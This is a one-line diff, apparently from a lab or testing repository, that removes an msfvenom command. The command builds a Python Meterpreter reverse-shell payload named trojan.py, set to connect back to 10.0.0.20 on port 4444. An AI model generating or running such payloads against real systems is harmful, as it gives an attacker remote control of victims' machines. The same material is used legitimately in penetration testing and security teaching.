@@ -1,1 +1,0 @@
-msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.20 LPORT=4444 > /home/vagrant/Desktop/trojan.py
